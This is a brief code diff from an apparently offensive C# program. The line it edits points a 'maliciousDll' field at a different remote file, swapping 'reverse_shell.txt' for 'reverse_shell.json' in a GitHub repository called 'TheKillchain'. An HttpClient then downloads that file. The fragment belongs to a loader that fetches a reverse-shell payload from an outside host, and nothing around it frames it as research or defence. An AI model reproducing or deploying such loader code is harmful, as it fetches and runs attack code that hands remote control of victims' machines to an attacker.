@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 public class Program {
 
 
-    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.txt");
+    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.json");
 
     public static byte[] GetMaliciousDll(string url) {
         HttpClient client = new HttpClient();
